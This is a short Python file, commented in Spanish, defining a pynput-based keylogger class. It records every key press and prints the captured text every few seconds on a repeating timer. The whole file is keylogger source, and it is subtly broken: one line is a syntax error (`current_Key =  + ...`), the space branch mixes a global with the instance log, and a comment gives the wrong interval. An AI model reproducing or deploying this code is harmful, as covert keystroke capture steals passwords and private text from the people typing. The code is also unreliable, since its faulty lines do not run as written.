import pynput
import threading

log = ""

class Keylogger:
    def __init__(self):
        self.log = ""
        
    def concatenar_al_log(self, string):
        self.log = self.log + string
        

    def tecla_presionada(self,key):
        global log
        try:
            current_Key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_Key = log + " "
            else:
                current_Key =  + " " + str(key) + " "
        self.concatenar_al_log(current_Key)
              # Muestra el texto entero 



    def reporte(self):
        global log 
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.reporte) #Cada 10 segundos se ejecuta la función reporte. Con while loop daría problemas. 
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.tecla_presionada)
        with keyboard_listener:
            self.reporte()
            keyboard_listener.join()
